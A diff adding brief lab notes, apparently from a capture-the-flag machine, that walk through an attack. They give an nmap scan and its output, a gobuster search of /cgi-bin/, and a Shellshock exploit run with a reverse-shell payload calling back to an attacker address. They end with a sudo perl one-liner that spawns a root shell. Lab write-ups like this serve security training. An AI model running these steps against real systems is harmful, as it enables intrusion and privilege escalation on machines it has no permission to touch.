@@ -1,0 +1,30 @@
+└─$ nmap -A 10.10.10.56 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-10 18:47 CEST
+Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 40.15% done; ETC: 18:48 (0:00:33 remaining)
+Nmap scan report for 10.10.10.56
+Host is up (0.047s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE VERSION
+80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp  open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
+|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
+|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
+25819/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt  -x sh
+
+apache cgi shellshock
+https://www.exploit-db.com/exploits/34900
+
+python 34900.py payload=reverse rhost=10.10.10.56lhost=10.10.14.17 lport=5555
+
+sudo -l
+sudo /usr/bin/perl -e 'exec "/bin/sh";'
+
+
